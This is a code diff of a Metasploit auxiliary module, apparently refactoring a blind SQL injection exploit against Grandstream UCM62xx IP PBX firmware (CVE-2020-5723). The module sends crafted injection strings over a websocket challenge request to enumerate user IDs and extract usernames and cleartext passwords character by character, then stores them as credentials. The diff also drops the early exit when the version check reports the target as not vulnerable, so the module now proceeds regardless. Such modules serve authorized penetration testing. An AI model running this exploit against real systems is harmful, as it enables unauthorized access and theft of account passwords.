@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-# http://firmware.grandstream.com/Release_UCM62xx_1.0.20.22.zip
-
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
@@ -23,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
           endpoint, and specifically occurs when the user requests the challenge (as part of a
           challenge and response authentication scheme). The injection is blind, but the server
           response contains a different status code if the query was successful. As such, the
-          attack can guess the contents of the user database. Most helpfully, the passwords are
+          attacker can guess the contents of the user database. Most helpfully, the passwords are
           stored in cleartext within the user table (CVE-2020-5723).
 
           This issue was patched in Grandstream UCM62xx IP PBX frimware version 1.20.22.
@@ -52,22 +50,23 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_options([
       OptString.new('TARGETURI', [true, 'Base path', '/']),
-      OptInt.new('ID_SCAN', [true, 'The number of initial user ids to scan', 30])
+      OptInt.new('STRING_FIELD_LENGTH', [true, 'The maximum length of the guessed username and/or password.', 16]),
+      OptInt.new('ID_SCAN', [true, 'Total number of user IDs to try enumerate for valid users. 0 through (this number - 1)', 30])
     ])
   end
 
   # Craft the SQL injection into the challenge request
-  def create_injection_request(payload)
+  def create_injection_request(query)
     id = Rex::Text.rand_text_alphanumeric(12)
     req = "{\"type\":\"request\",\"message\":{\"transactionid\":\"#{id}\",\"version\":\"1.0\",\"action\":\"challenge\",\"username\":\""
-    req.concat(payload)
+    req.concat(query)
     req.concat('"}}')
     req
   end
 
   # Retrieve the server's response and pull out the status response. The return value is
   # the server's response value (or 1 on failure).
-  def recv_wsframe(wsock)
+  def recv_wsframe_status(wsock)
     res = wsock.get_wsframe
     return 1 unless res
 
@@ -86,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
   # Guess valid user ids in the database. These are sequential (0, 1, 2, etc) with the default
   # admin user starting at 0. Return an array of valid ids.
   def guess_user_ids
-    return_array = Array.new
+    return_array = []
 
     datastore['ID_SCAN'].times do |n|
       wsock = connect_ws(
@@ -95,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       wsock.put_wstext(create_injection_request("' OR user_id=#{n}--"))
-      next unless recv_wsframe(wsock) == 0
+      next unless recv_wsframe_status(wsock) == 0
 
       return_array << n
     end
@@ -103,17 +102,16 @@ class MetasploitModule < Msf::Auxiliary
     return_array
   end
 
-  # A generic injection to guess a fields length. This assumes the field won't be longer
-  # than 64 characters. Which is probably a safe bet.
+  # A generic injection to guess a fields length.
   def guess_field_length(id, field)
-    64.times do |n|
+    datastore['STRING_FIELD_LENGTH'].times do |n|
       wsock = connect_ws(
         'method' => 'GET',
         'uri' => normalize_uri(target_uri.path, '/websockify')
       )
 
       wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND LENGTH(#{field})=#{n}--"))
-      next unless recv_wsframe(wsock) == 0
+      next unless recv_wsframe_status(wsock) == 0
 
       return n
     end
@@ -128,9 +126,9 @@ class MetasploitModule < Msf::Auxiliary
   def guess_string(id, field, length)
     string = ''
     length.times do |n|
-      for printable in 0x20...0x7e
+      (0x20...0x7e).each do |printable|
 
-        next unless printable != 0x5c
+        next if printable == '\\'.ord
 
         char = printable.chr
 
@@ -141,7 +139,7 @@ class MetasploitModule < Msf::Auxiliary
         temp_string = string + char
 
         wsock.put_wstext(create_injection_request("\' OR user_id=#{id} AND substr(#{field},1,#{temp_string.length})='#{temp_string}'--"))
-        next unless recv_wsframe(wsock) == 0
+        next unless recv_wsframe_status(wsock) == 0
 
         string.concat(char)
         return string if string.length == length
@@ -158,7 +156,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # Extract the version from the cgi endpoint and return true if the
   # reported version is affected by the vulnerability.
-  def check_version
+  def vulnerable_version?
     normalized_uri = normalize_uri(target_uri.path, '/cgi')
     print_status("Requesting version information from #{normalized_uri}")
     res = send_request_cgi({
@@ -170,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     return false unless res&.code == 200
 
     body_json = res.get_json_document
-    return false unless body_json
+    return false if body_json.empty?
 
     prog_version = body_json.dig('response', 'prog_version')
     return false if prog_version.nil?
@@ -178,14 +176,13 @@ class MetasploitModule < Msf::Auxiliary
     print_status("The reported version is: #{prog_version}")
 
     version = Rex::Version.new(prog_version)
-    return version < Rex::Version.new('1.0.20.22')
+    version < Rex::Version.new('1.0.20.22')
   end
 
   def run_host(_ip)
     # do a version check so the attacker doesn't waste their time
-    if !check_version
-      print_error('The reported version is not vulnable')
-      return
+    if !vulnerable_version?
+      print_error('The reported version is not vulnerable.')
     end
 
     # attack happens in three parts:
@@ -203,16 +200,13 @@ class MetasploitModule < Msf::Auxiliary
       username = guess_string(id, 'user_name', username_length)
       next if username.empty?
 
-      print_status("Found username: #{username}")
-
       password_length = guess_field_length(id, 'user_password')
       next unless password_length != 0
 
       password = guess_string(id, 'user_password', password_length)
       next if password.empty?
 
-      print_status("Found password: #{password}")
-
+      print_status("Found the following username and password: #{username} - #{password}")
       store_valid_credential(user: username, private: password)
     end
   end
